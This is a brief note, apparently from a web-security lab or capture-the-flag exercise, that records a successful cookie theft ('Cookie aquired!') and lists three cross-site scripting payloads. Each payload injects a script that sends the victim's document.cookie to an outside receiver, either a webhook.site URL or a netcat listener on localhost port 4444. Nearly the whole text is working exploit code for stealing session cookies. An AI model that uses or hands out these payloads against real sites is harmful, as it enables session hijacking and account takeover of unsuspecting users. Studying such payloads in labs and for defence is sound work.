- Cookie aquired!
- Alternate payload: `<script> var i = new Image; i.src="https://webhook.site/b9b4e186-1f27-4dac-b4f2-911eac7325c1/"+document.cookie;</script>`
- Alternate payload: `<script>new Image().src = "https://webhook.site/b9b4e186-1f27-4dac-b4f2-911eac7325c1/" + document.cookie</script>`

- Include plain text to avoid encoding to use netcat: `<script>new Image().src = "http://localhost:4444/test?" + document.cookie</script>`
